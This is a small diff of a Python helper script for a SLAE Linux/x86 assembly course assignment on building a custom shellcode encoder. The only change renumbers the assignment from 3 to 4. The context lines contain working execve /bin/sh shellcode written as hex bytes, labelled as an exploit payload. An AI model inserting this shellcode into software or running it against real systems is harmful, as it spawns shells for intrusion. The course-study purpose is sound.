@@ -2,7 +2,7 @@
 
 # Student ID  : SLAE-1250
 # Student Name: Jonathan "Chops" Crosby
-# Assignment 3: Custom Encoder (Linux/x86) Python Helper
+# Assignment 4: Custom Encoder (Linux/x86) Python Helper
 
 # clean shell code for our execve exploit
 cleanShellCode = ["31","c0","50","68","2f","2f","73","68","68","2f","62","69","6e","89","e3","50","89","e2","53","89","e1","b0","0b","cd","80"]
